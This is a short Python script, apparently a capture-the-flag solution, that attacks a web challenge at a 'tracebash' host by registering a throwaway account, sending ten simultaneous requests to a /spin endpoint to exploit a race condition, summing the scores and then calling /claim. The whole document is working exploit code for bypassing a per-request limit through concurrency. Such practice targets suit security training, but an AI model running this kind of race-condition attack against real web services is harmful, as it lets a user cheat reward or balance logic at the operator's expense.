import requests, threading, sys

base = 'https://web-random-cheese.tracebash.xyz'

def register_login():
    s = requests.Session()
    import string, random
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    s.post(f'{base}/register', data={'username': name, 'password': name}, allow_redirects=False)
    s.post(f'{base}/login', data={'username': name, 'password': name}, allow_redirects=False)
    return s, name

# 1. Test race condition: spin multiple times in parallel
s, _ = register_login()

def spin(s, results, i):
    r = s.post(f'{base}/spin')
    results[i] = r.json()

# 10 simultaneous spins
results = {}
threads = []
for i in range(10):
    t = threading.Thread(target=spin, args=(s, results, i))
    threads.append(t)
    t.start()
for t in threads:
    t.join()

print('Race condition results:')
for k in sorted(results):
    print(f'  {k}: {results[k]}')

# Sum the scores
total = sum(results[k]['score'] for k in sorted(results))
print('Total score:', total)

# Now claim
r = s.post(f'{base}/claim')
print('Claim status:', r.status_code)
print('Claim body (first 800):', r.text[:800].encode('ascii', errors='replace').decode('ascii'))